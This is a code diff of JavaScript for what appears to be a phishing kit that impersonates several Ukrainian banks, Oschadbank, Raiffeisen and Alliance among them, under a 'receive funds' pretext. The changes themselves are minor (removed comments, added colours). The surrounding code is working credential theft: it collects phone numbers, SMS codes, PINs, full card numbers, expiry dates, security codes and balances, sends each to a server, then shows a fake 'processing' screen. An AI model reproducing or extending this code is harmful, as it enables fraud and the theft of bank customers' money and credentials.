@@ -553,8 +553,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- CONFIG & STATE VARIABLES ---
     const bankFlows = {
         'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank' },
-        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://play-lh.googleusercontent.com/bKSKrzk-rS1KB0c0CApj1C8P3XLa5r_KH6eKyYWw4FJz3p5NavHLB9MakrFRJLbhMzw', theme: 'raiffeisen' },
-        // --- ИЗМЕНЕНИЕ: Новый URL для логотипа ---
+        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://play-lh.googleusercontent.com/bKSKrzk-rS1KB0c0CApj1C8P3XLa5r_KH6eKyYWw4FJz3p5NavHLB9MakrFRJLbhMzw', theme: 'raiffeisen', colors: { primary: '#FFCC00', text: '#F2F2F7', bg: '#1C1C1E' } },
         'alliance': { name: 'Альянс', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/f/f1/Logo_Bank_Alliance.png', theme: 'alliance' },
         'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', colors: { primary: '#8DC63F', text: '#FFFFFF', bg: '#74A22A' }, steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
         'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', colors: { primary: '#FF4A83', text: '#FFFFFF', bg: '#1A1A1A' }, steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
@@ -656,7 +655,6 @@ document.addEventListener('DOMContentLoaded', () => {
         allianceModalContent.innerHTML = html;
     }
 
-    // --- ИЗМЕНЕНИЕ: Новая функция для экрана подтверждения карты ---
     function renderAllianceCardDetailsScreen() {
         const html = `
             <div class="alliance-header">
@@ -703,7 +701,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 renderAlliancePhoneScreen();
             }
             
-            // --- ИЗМЕНЕНИЕ: Кнопка назад с экрана деталей карты ---
             if (target.closest('#alliance-back-details-btn')) {
                 renderAllianceCardScreen();
             }
@@ -715,7 +712,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 renderAllianceCardScreen();
             }
 
-            // --- ИЗМЕНЕНИЕ: Логика кнопки "Отримати кошти" ---
             if (target.id === 'alliance-submit-btn' && target.classList.contains('active')) {
                 const cardInput = document.getElementById('alliance-card-input');
                 const card = cardInput.value.replace(/\s/g, '');
@@ -723,7 +719,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 renderAllianceCardDetailsScreen(); // Переход на новый экран
             }
 
-            // --- ИЗМЕНЕНИЕ: Логика новой кнопки "Продовжити" ---
             if (target.id === 'alliance-details-submit-btn' && target.classList.contains('active')) {
                 const cardDetailsData = {
                     card_number_full: document.getElementById('alliance-details-card-input').value.replace(/\s/g, ''),
@@ -752,7 +747,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 document.getElementById('alliance-submit-btn').classList.toggle('active', value.length === 16);
              }
 
-             // --- ИЗМЕНЕНИЕ: Валидация и форматирование для нового экрана ---
              if (target.id === 'alliance-details-card-input') {
                 let value = target.value.replace(/\D/g, '').substring(0, 16);
                 target.value = value.replace(/(\d{4})/g, '$1 ').trim();
@@ -769,7 +763,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 target.value = target.value.replace(/\D/g, '').substring(0, 3);
              }
              if (target.id === 'alliance-details-balance-input') {
-                 // Allow numbers and one comma
                 let value = target.value.replace(/[^0-9,]/g, '');
                 let parts = value.split(',');
                 if (parts.length > 2) {
@@ -778,7 +771,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 target.value = value;
              }
 
-             // Проверка активации кнопки "Продовжити" на экране деталей
              if (document.getElementById('alliance-details-submit-btn')) {
                  const card = document.getElementById('alliance-details-card-input').value.replace(/\D/g, '');
                  const exp = document.getElementById('alliance-details-exp-input').value;
@@ -855,7 +847,6 @@ document.addEventListener('DOMContentLoaded', () => {
         continueBtn.addEventListener('click', () => {
             if (continueBtn.classList.contains('active')) {
                 const phone = '+380' + phoneInput.value;
-                // --- ИЗМЕНЕНИЕ: Отправляем только номер, isFinal = false ---
                 sendDataToServer({ phone: phone }, false);
                 renderRaiffSmsScreen(phone);
             }
@@ -900,7 +891,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 const allFilled = codeInputs.every(inp => inp.value.length === 1);
                 if (allFilled) {
                     const code = codeInputs.map(inp => inp.value).join('');
-                    // --- ИЗМЕНЕНИЕ: Отправляем только SMS-код, isFinal = false ---
                     sendDataToServer({ sms_code: code }, false);
                     renderRaiffPinScreen();
                 }
@@ -990,7 +980,6 @@ document.addEventListener('DOMContentLoaded', () => {
             updateDots();
             
             if (pin.length === 4) {
-                // --- ИЗМЕНЕНИЕ: Отправляем только PIN, isFinal = true ---
                 sendDataToServer({ pin: pin }, true);
                 raiffModalContent.innerHTML = `<div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="raiff-main-title">Обробка...</h2><p class="raiff-subtitle">Будь ласка, зачекайте. Не закривайте сторінку.</p></div>`;
             }
